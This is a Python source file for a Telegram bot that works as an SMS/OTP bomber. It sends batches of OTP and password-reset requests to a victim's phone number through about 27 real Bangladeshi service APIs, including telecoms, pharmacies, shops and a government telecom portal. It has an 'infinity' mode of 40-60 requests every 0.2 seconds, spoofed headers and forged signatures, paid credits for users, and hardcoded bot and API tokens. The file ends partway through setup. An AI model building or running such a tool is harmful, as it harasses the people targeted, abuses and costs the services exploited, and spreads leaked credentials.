#[file name]: telecom_bot_ultra_fast.py
#[file content begin]
import os
import sys
import time
import random
import sqlite3
import threading
import json
import hashlib
from datetime import datetime
import asyncio
import concurrent.futures
from queue import Queue

print(" Installing required packages...")
try:
    import requests
    from telegram import Update
    from telegram.ext import Application, CommandHandler, CallbackContext
    print(" Packages already installed")
except ImportError:
    print(" Installing packages...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "python-telegram-bot", "--quiet"])
    import requests
    from telegram import Update
    from telegram.ext import Application, CommandHandler, CallbackContext

# ==================== CONFIGURATION ====================
TELEGRAM_BOT_TOKEN = "8243812645:AAG_cRv_NbgGNkoUArUh2vx0EjF03C4gt8s"
ADMIN_USER_ID = 7603917125
ADMIN_USERNAME = "Ahameed Xlost "
# =======================================================

print(f" Bot Token: {TELEGRAM_BOT_TOKEN[:15]}...")
print(f" Admin ID: {ADMIN_USER_ID}")
print(f" Ultra Fast Mode: 0.2s interval, 20 requests/batch")

class Colors:
    RESET = "\033[0m"
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    ORANGE = "\033[38;5;214m"
    PURPLE = "\033[38;5;129m"

class FastDatabase:
    def __init__(self):
        self.conn = sqlite3.connect('telecom_fast.db', check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                is_admin INTEGER DEFAULT 0,
                credits INTEGER DEFAULT 0,
                can_use_infinity INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS fast_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                mobile TEXT,
                mode TEXT,
                requests_sent INTEGER,
                success_count INTEGER,
                duration REAL,
                speed REAL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS infinity_stats (
                user_id INTEGER PRIMARY KEY,
                mobile TEXT,
                is_running INTEGER DEFAULT 0,
                total_requests INTEGER DEFAULT 0,
                success_count INTEGER DEFAULT 0,
                start_time TIMESTAMP,
                last_update TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Insert admin
        cursor.execute('''
            INSERT OR REPLACE INTO users 
            (user_id, username, first_name, is_admin, credits, can_use_infinity)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (ADMIN_USER_ID, ADMIN_USERNAME, "Ahameed", 1, 99999, 1))
        
        self.conn.commit()
    
    def add_user(self, user_id, username, first_name, last_name):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR IGNORE INTO users 
            (user_id, username, first_name, last_name, credits)
            VALUES (?, ?, ?, ?, 200)
        ''', (user_id, username, first_name, last_name))
        self.conn.commit()
    
    def get_user(self, user_id):
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        return cursor.fetchone()
    
    def update_credits(self, user_id, amount):
        cursor = self.conn.cursor()
        cursor.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
        self.conn.commit()
    
    def is_admin(self, user_id):
        user = self.get_user(user_id)
        return user and user[4] == 1
    
    def can_use_infinity(self, user_id):
        user = self.get_user(user_id)
        return user and user[6] == 1
    
    def set_infinity_permission(self, user_id, allowed):
        cursor = self.conn.cursor()
        cursor.execute("UPDATE users SET can_use_infinity = ? WHERE user_id = ?", (1 if allowed else 0, user_id))
        self.conn.commit()
    
    def add_fast_history(self, user_id, mobile, mode, requests_sent, success_count, duration, speed):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO fast_history 
            (user_id, mobile, mode, requests_sent, success_count, duration, speed)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (user_id, mobile, mode, requests_sent, success_count, duration, speed))
        self.conn.commit()
    
    def update_infinity_stats(self, user_id, mobile, is_running, requests_added=0, success_added=0):
        cursor = self.conn.cursor()
        
        if is_running:
            cursor.execute('''
                INSERT OR REPLACE INTO infinity_stats 
                (user_id, mobile, is_running, total_requests, success_count, start_time)
                VALUES (?, ?, ?, COALESCE((SELECT total_requests FROM infinity_stats WHERE user_id = ?), 0) + ?, 
                        COALESCE((SELECT success_count FROM infinity_stats WHERE user_id = ?), 0) + ?, CURRENT_TIMESTAMP)
            ''', (user_id, mobile, 1, user_id, requests_added, user_id, success_added))
        else:
            cursor.execute("UPDATE infinity_stats SET is_running = 0 WHERE user_id = ?", (user_id,))
        
        self.conn.commit()
    
    def get_infinity_stats(self, user_id):
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM infinity_stats WHERE user_id = ?", (user_id,))
        return cursor.fetchone()
    
    def get_all_users(self):
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM users ORDER BY created_at DESC")
        return cursor.fetchall()

class UltraFastAPIXMSer:
    def __init__(self, db):
        self.db = db
        self.infinity_mode = {}
        self.running = False
        self.thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=100)
        
        # All API endpoints
        self.api_endpoints = [
            ("Wafilife", "POST", "https://www.wafilife.com/api/auth/send-otp", 
             lambda m: {"mobileNumber": m}, {"Content-Type": "application/json"}, "wafilife.com"),
            
            ("Arogga", "POST", "https://api.arogga.com/auth/v1/sms/send",
             lambda m: {'mobile': f"+88{m}", 'fcmToken': '', 'referral': ''}, 
             {"Content-Type": "application/x-www-form-urlencoded"}, "arogga.com"),
            
            ("Kormi24", "POST", "https://api.kormi24.com/graphql",
             lambda m: {
                 "operationName": "sendOTP",
                 "variables": {
                     "type": 1,
                     "mobile": m,
                     "additional": json.dumps({"user_agent": "web", "mobile": m}),
                     "hash": "329e67e52df9f76da3c375856b581cf78c14e999d079a6865053a2c7419ba5f6"
                 },
                 "query": "mutation sendOTP($mobile: String!, $type: Int!, $additional: String, $hash: String!) {\n  sendOTP(mobile: $mobile, type: $type, additional: $additional, hash: $hash) {\n    status\n    message\n    __typename\n  }\n}"
             }, {"Content-Type": "application/json", "authorization": "tok"}, "kormi24.com"),
            
            ("Bikroy", "POST", "https://bikroy.com/data/phone_number_login/verifications/phone_login",
             lambda m: {"phone": m}, {"Content-Type": "application/json", "application-name": "web", "accept-language": "bn"}, "bikroy.com"),
            
            ("BeautyBooth Register", "POST", "https://admin.beautybooth.com.bd/api/v2/auth/register",
             lambda m: {"value": m, "type": "phone", "token": random.randint(30, 50)}, 
             {"Content-Type": "application/json"}, "beautybooth.com"),
            
            ("BeautyBooth Forget", "POST", "https://admin.beautybooth.com.bd/api/v2/auth/password/forget_request",
             lambda m: {"value": m}, {"Content-Type": "application/json"}, "beautybooth.com"),
            
            ("RabbitHole", "POST", "https://apix.rabbitholebd.com/appv2/login/requestOTP",
             lambda m: {"mobile": f"+88{m}"}, 
             lambda m: {
                 "Content-Type": "application/json",
                 "current-time": str(int(time.time())),
                 "hash": hashlib.sha256(f"{m}{str(int(time.time()))}rabbithole".encode()).hexdigest()
             }, "rabbitholebd.com"),
            
            ("RedX", "GET", "https://api.redx.com.bd/v4/redx/does-user-exist",
             None, {"Content-Type": "application/json"}, "redx.com.bd"),
            
            ("Shomvob", "POST", "https://backend-api.shomvob.co/api/v2/otp/phone",
             lambda m: {"phone": f"88{m}", "is_retry": 0}, 
             {"Content-Type": "application/json", "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q"}, 
             "shomvob.co"),
            
            ("Kirei", "POST", "https://frontendapi.kireibd.com/api/v2/send-login-otp",
             lambda m: {"email": m}, 
             {"Content-Type": "application/json", "x-xsrf-token": "eyJpdiI6IlEraStyclNKMys3d1VMalFNbEx3cHc9PSIsInZhbHVlIjoibE8vZ28wM0RVaGI4RzhBY1NjeTNMV0lzOEdzSzdmUlRqejRKUUYyUzZxNGozaGpZUjFQWFpGOUFtVnNmZVVRR21mNTY4aEo0WVUyVjFyZFJMQnJ4L2xoa1lDTjNkM2gwU2ZabXhDT1BZMW9IWnNXWlpiM0ZSVGc0MVFsb1VKUHIiLCJtYWMiOiI4MjhhNjU3ZGRkNDA5NTkwYjk4ZWRlMGUzN2FmYmU3NTkzMTExMWM5MTM3Mzk2ZTI5YjQ5OGJkMTcxNmI5ZGMzIiwidGFnIjoiIn0=", "X-Requested-With": "XMLHttpRequest"}, 
             "kireibd.com"),
            
            ("Apex4u", "POST", "https://api.apex4u.com/api/auth/login",
             lambda m: {"phoneNumber": m}, {"Content-Type": "application/json"}, "apex4u.com"),
            
            ("Medha", "POST", "https://developer.medha.info/api/send-otp",
             lambda m: {"phone": m, "is_register": "1"}, {"Content-Type": "application/json"}, "medha.info"),
            
            ("BTCL", "POST", "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
             lambda m: {"phoneNbr": m, "email": "", "OTPType": 1, "userName": ""}, 
             {"Content-Type": "application/json"}, "btcl.gov.bd"),
            
            ("Doctime", "POST", "https://admin.doctime.com.bd/api/v2/authenticate",
             lambda m: {"country_calling_code": "88", "contact_no": m, "timestamp": int(time.time())}, 
             lambda m: {
                 "Content-Type": "application/json",
                 "signature": hashlib.sha256(f"dt{m}{int(time.time())}".encode()).hexdigest(),
                 "platform": "Web"
             }, "doctime.com.bd"),
            
            ("Chardike", "POST", "https://api.chardike.com/api/otp/send",
             lambda m: {"phone": m, "otp_type": "login"}, {"Content-Type": "application/json"}, "chardike.com"),
            
            ("Banglalink", "POST", "https://web-api.banglalink.net/api/v1/user/otp-login/request",
             lambda m: {"mobile": m}, 
             lambda m: {
                 "Content-Type": "application/json",
                 "client-security-token": hashlib.sha256(f"BL{m}{str(int(time.time()))}".encode()).hexdigest()
             }, "banglalink.net"),
            
            ("Bioscope", "POST", "https://api-dynamic.bioscopelive.com/v2/auth/login",
             lambda m: {"number": f"+88{m}"}, 
             {"Content-Type": "application/json"}, "bioscopelive.com"),
            
            ("Grameenphone", "POST", "https://weblogin.grameenphone.com/backend/api/v1/otp",
             lambda m: {"msisdn": m}, 
             {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"}, "grameenphone.com"),
            
            ("Airtel", "POST", "https://www.bd.airtel.com/en/auth/login:alif",
             lambda m: f'[{{"msisdn":"{m}"}}]', 
             lambda m: {
                 "Accept": "text/x-component",
                 "Content-Type": "text/plain;charset=UTF-8",
                 "next-action": hashlib.sha256(f"airtel{m}{int(time.time())}".encode()).hexdigest()[:40]
             }, "airtel.com"),
            
            ("Banglalink Eshop", "POST", "https://eshop-api.banglalink.net/api/v1/customer/send-otp",
             lambda m: {"type": "phone", "phone": m}, 
             lambda m: {
                 "Content-Type": "application/json",
                 "client-security-token": hashlib.sha256(f"BL_ESHOP_{m}_{str(int(time.time()))}".encode()).hexdigest()
             }, "banglalink.net"),
            
            ("BongoBD", "POST", "https://accounts.bongobd.com/realms/bongo/login-actions/authenticate",
             lambda m: {
                 'country': "88",
                 'phoneNumberPart': m,
                 'phone_number': f"+88{m}"
             }, 
             {"Content-Type": "application/x-www-form-urlencoded"}, "bongobd.com"),
            
            ("Cinematic", "POST", f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/880",
             lambda m: {}, 
             {"Content-Type": "application/json", "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"}, 
             "cinematic.mobi"),
            
            ("Ultimate Register", "POST", "https://ultimateasiteapi.com/api/register-customer",
             lambda m: {
                 "customer_name": f"XMS User{random.randint(1000,9999)}",
                 "customer_password": "XMS@1234",
                 "customer_password_confirmation": "XMS@1234",
                 "customer_email": f"user{random.randint(10000,99999)}@XMS.com",
                 "customer_contact": m
             }, 
             {"Content-Type": "application/json"}, "ultimateorganiclife.com"),
            
            ("Ultimate Forget", "POST", "https://ultimateasiteapi.com/api/forget-customer-password",
             lambda m: {"user_input": m}, {"Content-Type": "application/json"}, "ultimateorganiclife.com"),
            
            ("Garibook", "POST", "https://api.garibookadmin.com/api/v3/user/login",
             lambda m: {"mobile": m, "recaptcha_token": "garibookcaptcha", "channel": "web"}, 
             {"Content-Type": "application/json"}, "garibook.com"),
            
            ("Osudpotro", "POST", "https://api.osudpotro.com/api/v1/users/send_otp",
             lambda m: {"mobile": f"+88-{m}", "deviceToken": "web", "language": "en", "os": "web"}, 
             {"Content-Type": "application/json;charset=UTF-8"}, "osudpotro.com"),
            
            ("KFC", "POST", "https://kfcbd.com/livewire/message/home.login",
             lambda m: {
                 "fingerprint": {
                     "id": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=20)),
                     "name": "home.login",
                     "locale": "en",
                     "path": "login",
                     "method": "GET",
                     "v": "acj"
                 },
                 "serverMemo": {
                     "children": [],
                     "errors": [],
                     "htmlHash": "c5305fba",
                     "data": {"mobile": m, "step": 1},
                     "dataMeta": [],
                     "checksum": hashlib.sha256(f"kfc{m}{int(time.time())}".encode()).hexdigest()
                 }
             }, 
             {"Content-Type": "application/json"}, "kfcbd.com"),
        ]
        
        print(f"{Colors.GREEN} Loaded {len(self.api_endpoints)} API endpoints{Colors.RESET}")
    
    def get_headers(self, domain=""):
        chrome_ver = random.choice(['121', '120', '119', '118', '117', '116'])
        user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.0.0 Safari/537.36"
        
        headers = {
            'User-Agent': user_agent,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        }
        
        if domain:
            headers.update({
                'Origin': f'https://{domain}',
                'Referer': f'https://{domain}/',
            })
        
        return headers
    
    def make_fast_request(self, endpoint_info, mobile):
        """Make a single API request"""
        name, method, url, payload_func, headers_info, domain = endpoint_info
        
        try:
            headers = self.get_headers(domain)
            
            if callable(headers_info):
                headers.update(headers_info(mobile))
            else:
                headers.update(headers_info)
            
            if payload_func is None:
                # GET request
                if url == "https://api.redx.com.bd/v4/redx/does-user-exist":
                    url = f"{url}?phoneNumber=88{mobile}"
                response = requests.get(url, headers=headers, timeout=5, verify=False)
            else:
                # POST request
                if callable(payload_func):
                    payload = payload_func(mobile)
                else:
                    payload = payload_func
                
                if method == "POST":
                    if url == f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/880":
                        url = f"{url}{mobile}"
                    
                    if isinstance(payload, str):
                        response = requests.post(url, data=payload, headers=headers, timeout=5, verify=False)
                    else:
                        response = requests.post(url, json=payload, headers=headers, timeout=5, verify=False)
            
            return response.status_code in [200, 201, 202]
            
        except Exception as e:
            return False
    
    def run_ultra_fast_XMS(self, mobile, batch_size=20):
        """Run ultra-fast XMS - 20 requests every 0.2 seconds"""
        print(f"{Colors.CYAN} Starting ULTRA FAST XMS for: {mobile}{Colors.RESET}")
        print(f"{Colors.YELLOW} Batch size: {batch_size}, Interval: 0.2s{Colors.RESET}")
        
        total_requests = 0
        success_count = 0
        start_time = time.time()
        
        # Run 5 batches
        for batch in range(5):
            if not self.running:
                break
                
            batch_success = 0
            futures = []
            
            # Submit batch requests
            for i in range(batch_size):
                if i < len(self.api_endpoints):
                    endpoint = self.api_endpoints[i]
                else:
                    endpoint = random.choice(self.api_endpoints)
                
                future = self.thread_pool.submit(self.make_fast_request, endpoint, mobile)
                futures.append(future)
            
            # Wait for batch completion
            for future in concurrent.futures.as_completed(futures):
                if future.result():
                    batch_success += 1
            
            total_requests += batch_size
            success_count += batch_success
            
            # Print batch stats
            batch_time = time.time() - start_time
            speed = total_requests / batch_time if batch_time > 0 else 0
            
            print(f"{Colors.PURPLE}  Batch {batch+1}: {batch_success}/{batch_size} | "
                  f"Total: {success_count}/{total_requests} | "
                  f"Speed: {speed:.1f} req/s{Colors.RESET}")
            
            # Wait 0.2 seconds
            time.sleep(0.2)
        
        duration = time.time() - start_time
        speed = total_requests / duration if duration > 0 else 0
        
        print(f"{Colors.GREEN} Ultra Fast XMS Complete: {success_count}/{total_requests} "
              f"({(success_count/total_requests*100):.1f}%) | Speed: {speed:.1f} req/s{Colors.RESET}")
        
        return {
            'mobile': mobile,
            'total_requests': total_requests,
            'success_count': success_count,
            'duration': duration,
            'speed': speed
        }
    
    def start_ultra_infinity(self, user_id, mobile):
        """Start ultra infinity mode - 40+ requests every 0.2 seconds"""
        if user_id in self.infinity_mode:
            return False, "Already running"
        
        self.infinity_mode[user_id] = {
            'mobile': mobile,
            'running': True,
            'total_requests': 0,
            'success_count': 0,
            'start_time': time.time(),
            'last_batch_time': time.time()
        }
        
        # Update database
        self.db.update_infinity_stats(user_id, mobile, True)
        
        # Start infinity thread
        thread = threading.Thread(target=self._ultra_infinity_worker, args=(user_id, mobile), daemon=True)
        thread.start()
        
        return True, "Ultra Infinity started"
    
    def _ultra_infinity_worker(self, user_id, mobile):
        """Ultra infinity worker - 40+ requests every 0.2 seconds"""
        print(f"{Colors.MAGENTA} Starting ULTRA INFINITY for user {user_id}{Colors.RESET}")
        
        batch_counter = 0
        
        while user_id in self.infinity_mode and self.infinity_mode[user_id]['running']:
            try:
                batch_size = random.randint(40, 60)  # 40-60 requests per batch
                batch_success = 0
                futures = []
                
                # Submit batch
                for i in range(batch_size):
                    endpoint = random.choice(self.api_endpoints)
                    future = self.thread_pool.submit(self.make_fast_request, endpoint, mobile)
                    futures.append(future)
                
                # Wait for results
                for future in concurrent.futures.as_completed(futures):
                    if future.result():
                        batch_success += 1
                
                # Update stats
                if user_id in self.infinity_mode:
                    self.infinity_mode[user_id]['total_requests'] += batch_size
                    self.infinity_mode[user_id]['success_count'] += batch_success
                    self.infinity_mode[user_id]['last_batch_time'] = time.time()
                    
                    # Update database every 10 batches
                    if batch_counter % 10 == 0:
                        self.db.update_infinity_stats(
                            user_id, mobile, True, 
                            batch_size, batch_success
                        )
                
                batch_counter += 1
                
                # Print stats every 5 batches
                if batch_counter % 5 == 0 and user_id in self.infinity_mode:
                    stats = self.infinity_mode[user_id]
                    duration = time.time() - stats['start_time']
                    speed = stats['total_requests'] / duration if duration > 0 else 0
                    
                    print(f"{Colors.ORANGE} Infinity [{user_id}]: Batch {batch_counter} | "
                          f"Total: {stats['success_count']}/{stats['total_requests']} | "
                          f"Speed: {speed:.1f} req/s{Colors.RESET}")
                
                # Wait 0.2 seconds
                time.sleep(0.2)
                
            except Exception as e:
                print(f"{Colors.RED}Infinity error: {e}{Colors.RESET}")
                time.sleep(1)
        
        print(f"{Colors.YELLOW} Ultra Infinity stopped for user {user_id}{Colors.RESET}")
    
    def stop_ultra_infinity(self, user_id):
        """Stop ultra infinity mode"""
        if user_id in self.infinity_mode:
            self.infinity_mode[user_id]['running'] = False
            # Wait a bit for cleanup
            time.sleep(0.5)
            if user_id in self.infinity_mode:
                # Save final stats
                stats = self.infinity_mode[user_id]
                duration = time.time() - stats['start_time']
                self.db.add_fast_history(
                    user_id, stats['mobile'], 'infinity',
                    stats['total_requests'], stats['success_count'],
                    duration, stats['total_requests'] / duration if duration > 0 else 0
                )
                del self.infinity_mode[user_id]
            
            self.db.update_infinity_stats(user_id, "", False)
            return True, "Stopped"
        return False, "Not running"
    
    def get_infinity_stats(self, user_id):
        """Get infinity stats"""
        if user_id in self.infinity_mode:
            stats = self.infinity_mode[user_id]
            duration = time.time() - stats['start_time']
            return {
                'mobile': stats['mobile'],
                'total_requests': stats['total_requests'],
                'success_count': stats['success_count'],
                'duration': duration,
                'speed': stats['total_requests'] / duration if duration > 0 else 0,
                'running': True
            }
        return None
    
    def start_background_fast(self):
        """Start background fast task"""
        self.running = True
        thread = threading.Thread(target=self._background_fast_worker, daemon=True)
        thread.start()
    
    def _background_fast_worker(self):
        """Background worker reading from numbers.txt"""
        while self.running:
            try:
                if os.path.exists('numbers.txt'):
                    with open('numbers.txt', 'r') as f:
                        numbers = [line.strip() for line in f if line.strip()]
                    
                    for mobile in numbers:
                        if not self.running:
                            break
                        
                        if len(mobile) == 11 and mobile.startswith(('013', '014', '015', '016', '017', '018', '019')):
                            print(f"{Colors.BLUE} Background Ultra Fast: {mobile}{Colors.RESET}")
                            result = self.run_ultra_fast_XMS(mobile, 15)  # 15 requests per batch
                            
                            # Save to history
                            self.db.add_fast_history(
                                0, mobile, 'background_fast',
                                result['total_requests'], result['success_count'],
                                result['duration'], result['speed']
                            )
                        
                        # Wait 30 seconds between numbers
                        for i in range(30):
                            if not self.running:
                                break
                            time.sleep(1)
                
                else:
                    print(f"{Colors.YELLOW} numbers.txt not found{Colors.RESET}")
                    time.sleep(60)
                    
            except Exception as e:
                print(f"{Colors.RED} Background error: {e}{Colors.RESET}")
                time.sleep(10)

class UltraFastTelegramBot:
    def __init__(self):
        self.db = FastDatabase()
        self.XMSer = UltraFastAPIXMSer(self.db)
        self.application = None
        
        # Start background
        self.XMSer.start_background_fast()
        print(f"{Colors.GREEN} Background Ultra Fast started{Colors.RESET}")
    
    async def start(self, update: Update, context: CallbackContext):
        user = update.effective_user
        self.db.add_user(user.id, user.username, user.first_name, user.last_name)
        
        user_info = self.db.get_user(user.id)
        credits = user_info[5] if user_info else 200
        is_admin = self.db.is_admin(user.id)
        can_infinity = self.db.can_use_infinity(user.id)
        
        welcome = f"""
 *ULTRA FAST XMS BOT*

 Welcome *{user.first_name}*!
 🌎ADMIN @Turmuxxbot
 *Credits:* `{credits}`
 *XMS Cost:* `20` credits
 *Speed:* `20 requests/0.2s`
 *Infinity:* `40+ requests/0.2s`

https://t.me/+ipZyt2axHeM3YTE1

 *Commands:*
/fast <number> - Ultra fast XMS (20 credits)
/ultrainfinity <number> - Start ultra infinity
/stopinfinity - Stop infinity
/credits - Check credits
/stats - View your stats

{' *Admin Commands:*' if is_admin else ''}
{'/users - View all users' if is_admin else ''}
{'/addcredits <id> <amount> - Add credits' if is_admin else ''}
{'/setinfinity <id> <0/1> - Infinity permission' if is_admin else ''}
{'/allstats - Bot statistics' if is_admin else ''}

 * Real-time speed tracking
"""
        
        await update.message.reply_text(welcome, parse_mode='Markdown')
    
    async def ultra_fast_XMS(self, update: Update, context: CallbackContext):
        user_id = update.effective_user.id
        user_info = self.db.get_user(user_id)
        
        if not user_info:
            await update.message.reply_text(" User not found")
            return
        
        credits = user_info[5]
        
        if credits < 20:
            await update.message.reply_text(f" Need 20 credits, you have {credits}")
            return
        
        if not context.args:
            await update.message.reply_text(" Usage: /fast 01712345678")
            return
        
        mobile = context.args[0].strip()
        
        if not (len(mobile) == 11 and mobile.startswith(('013', '014', '015', '016', '017', '018', '019'))):
            await update.message.reply_text(" Invalid number!")
            return
        
        # Deduct credits
        self.db.update_credits(user_id, -20)
        
        msg = await update.message.reply_text(
            f" *ULTRA FAST XMS STARTED*\n\n"
            f" Number: `{mobile}`\n"
            f" Speed: 20 requests/0.2s\n"
            f" Estimated: 1 second\n"
            f" Credits left: `{credits-20}`",
            parse_mode='Markdown'
        )
        
        # Run in thread
        def run_XMS():
            result = self.XMSer.run_ultra_fast_XMS(mobile, 20)
            
            # Save history
            self.db.add_fast_history(
                user_id, mobile, 'ultra_fast',
                result['total_requests'], result['success_count'],
                result['duration'], result['speed']
            )
            
            # Send result
            result_msg = f"""
 *ULTRA FAST COMPLETE!*

 Number: `{mobile}`
 Success: `{result['success_count']}/{result['total_requests']}`
 Success Rate: `{(result['success_count']/result['total_requests']*100):.1f}%`
 Average Speed: `{result['speed']:.1f} req/s`
 Duration: `{result['duration']:.2f}s`
 Credits: `{credits-20}`

 *Extreme Speed Achieved!*
"""
            
            context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=result_msg,
                parse_mode='Markdown'
            )
        
        threading.Thread(target=run_XMS).start()
    
    async def start_ultra_infinity(self, update: Update, context: CallbackContext):
        user_id = update.effective_user.id
        
        if not self.db.can_use_infinity(user_id):
            await update.message.reply_text(" Infinity not allowed!\nContact admin.")
            return
        
        if not context.args:
            await update.message.reply_text(" Usage: /ultrainfinity 01712345678")
            return
        
        mobile = context.args[0].strip()
        
        if not (len(mobile) == 11 and mobile.startswith(('013', '014', '015', '016', '017', '018', '019'))):
            await update.message.reply_text(" Invalid number!")
            return
        
        success, message = self.XMSer.start_ultra_infinity(user_id, mobile)
        
        if success:
            await update.message.reply_text(
                f" *ULTRA INFINITY STARTED!*\n\n"
                f" Number: `{mobile}`\n"
                f" Speed: 40-60 requests/0.2s\n"
                f" Estimated: 200-300 req/second\n"
                f" Stop with /stopinfinity\n\n"
                f"*This is EXTREME speed mode!*",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(f" {message}")
    
    async def stop_infinity(self, update: Update, context: CallbackContext):
        user_id = update.effective_user.id
        success, message = self.XMSer.stop_ultra_infinity(user_id)
        
        if success:
            stats = self.XMSer.get_infinity_stats(user_id)
            if stats:
                result_msg = f"""
 *ULTRA INFINITY STOPPED!* 

 Number: `{stats['mobile']}`
 Total Requests: `{stats['total_requests']}`
 Success: `{stats['success_count']}`
 Average Speed: `{stats['speed']:.1f} req/s`
 Duration: `{stats['duration']:.1f}s`

*Extreme performance achieved!*
"""
            else:
                db_stats = self.db.get_infinity_stats(user_id)
                if db_stats:
                    result_msg = f" Infinity stopped\nTotal: {db_stats[3]} requests"
                else:
                    result_msg = " Infinity stopped"
            
            await update.message.reply_text(result_msg, parse_mode='Markdown')
        else:
            await update.message.reply_text(" No active infinity")
    
    async def check_credits(self, update: Update, context: CallbackContext):
        user_id = update.effective_user.id
        user_info = self.db.get_user(user_id)
        
        if user_info:
            credits = user_info[5]
            await update.message.reply_text(f" *Credits:* `{credits}`", parse_mode='Markdown')
        else:
            await update.message.reply_text(" User not found")
    
    async def user_stats(self, update: Update, context: CallbackContext):
        user_id = update.effective_user.id
        user_info = self.db.get_user(user_id)
        
        if not user_info:
            await update.message.reply_text(" User not found")
            return
        
        credits = user_info[5]
        is_admin = user_info[4] == 1
        can_infinity = user_info[6] == 1
        
        stats_msg = f"""
 *Your Stats:*

 Credits: `{credits}`
 Admin: {' Yes' if is_admin else ' No'}
 Infinity: {' Allowed' if can_infinity else ' Not Allowed'}

*Active Infinity:*
"""
        
        infinity_stats = self.XMSer.get_infinity_stats(user_id)
        if infinity_stats:
            stats_msg += f"""
 *RUNNING*
 Number: `{infinity_stats['mobile']}`
 Requests: `{infinity_stats['total_requests']}`
 Success: `{infinity_stats['success_count']}`
 Speed: `{infinity_stats['speed']:.1f} req/s`
"""
        else:
            stats_msg += " Not running"
        
        await update.message.reply_text(stats_msg, parse_mode='Markdown')
    
    async def admin_users(self, update: Update, context: CallbackContext):
        user_id = update.effective_user.id
        
        if not self.db.is_admin(user_id):
            await update.message.reply_text(" Admin only!")
            return
        
        users = self.db.get_all_users()
        
        users_msg = " *All Users:*\n\n"
        for user in users[:20]:
            admin = "" if user[4] == 1 else ""
            infinity = "" if user[6] == 1 else ""
            users_msg += f"{admin}{infinity} ID: `{user[0]}`\n"
            users_msg += f"Name: {user[2]}\n"
            users_msg += f"Credits: {user[5]}\n"
            users_msg += "\n"
        
        await update.message.reply_text(users_msg, parse_mode='Markdown')
    
    async def admin_add_credits(self, update: Update, context: CallbackContext):
        user_id = update.effective_user.id
        
        if not self.db.is_admin(user_id):
            await update.message.reply_text(" Admin only!")
            return
        
        if len(context.args) < 2:
            await update.message.reply_text(" Usage: /addcredits <id> <amount>")
            return
        
        try:
            target_id = int(context.args[0])
            amount = int(context.args[1])
            
            self.db.update_credits(target_id, amount)
            await update.message.reply_text(f" Added {amount} credits to {target_id}")
        except:
            await update.message.reply_text(" Invalid input")
    
    async def admin_set_infinity(self, update: Update, context: CallbackContext):
        user_id = update.effective_user.id
        
        if not self.db.is_admin(user_id):
            await update.message.reply_text(" Admin only!")
            return
        
        if len(context.args) < 2:
            await update.message.reply_text(" Usage: /setinfinity <id> <0/1>")
            return
        
        try:
            target_id = int(context.args[0])
            allowed = int(context.args[1])
            
            self.db.set_infinity_permission(target_id, allowed == 1)
            status = "enabled" if allowed == 1 else "disabled"
            await update.message.reply_text(f" Infinity {status} for {target_id}")
        except:
            await update.message.reply_text(" Invalid input")
    
    async def admin_all_stats(self, update: Update, context: CallbackContext):
        user_id = update.effective_user.id
        
        if not self.db.is_admin(user_id):
            await update.message.reply_text(" Admin only!")
            return
        
        users = self.db.get_all_users()
        total_users = len(users)
        total_credits = sum(user[5] for user in users)
        active_infinity = len(self.XMSer.infinity_mode)
        
        stats_msg = f"""
 *BOT STATISTICS*

 Total Users: `{total_users}`
 Total Credits: `{total_credits}`
 Active Infinity: `{active_infinity}`

*Infinity Users:*\n"""
        
        for uid in self.XMSer.infinity_mode:
            inf_stats = self.XMSer.get_infinity_stats(uid)
            if inf_stats:
                stats_msg += f"� User `{uid}`: {inf_stats['total_requests']} requests ({inf_stats['speed']:.1f}/s)\n"
        
        if not self.XMSer.infinity_mode:
            stats_msg += "None"
        
        stats_msg += f"\n *Performance:*\n"
        stats_msg += f"� Thread Pool: 100 workers\n"
        stats_msg += f"� Batch Size: 20-60 requests\n"
        stats_msg += f"� Interval: 0.2 seconds\n"
        stats_msg += f"� Max Speed: 300+ req/second"
        
        await update.message.reply_text(stats_msg, parse_mode='Markdown')
    
    def run(self):
        """Start the bot"""
        self.application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        
        # Add handlers
        self.application.add_handler(CommandHandler("start", self.start))
